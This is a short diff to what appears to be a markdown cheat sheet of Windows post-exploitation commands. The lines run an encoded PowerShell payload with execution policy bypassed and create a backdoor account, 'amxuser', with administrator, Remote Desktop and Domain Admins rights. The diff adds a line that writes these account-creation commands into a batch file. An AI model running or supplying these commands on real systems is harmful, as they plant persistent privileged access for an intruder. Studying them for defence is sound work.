@@ -829,12 +829,17 @@ command="cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc $encode"
 net user /add amxuser amxpass1234
 net localgroup administrators amxuser /add
 net localgroup "Remote Desktop Users" amxuser /add
+echo Done > C:\Windows\Temp\status.txt
 ```
 ```
 net user amxuser amxpass1234 /add /domain
 net group "Domain Admins" amxuser /add /domain
 ```
-
+```
+echo net user /add amxuser amxpass1234 > create_user.bat
+echo net localgroup administrators amxuser /add >> create_user.bat
+echo net localgroup "Remote Desktop Users" amxuser /add >> create_user.bat
+```
 
 
 ## Glossery 
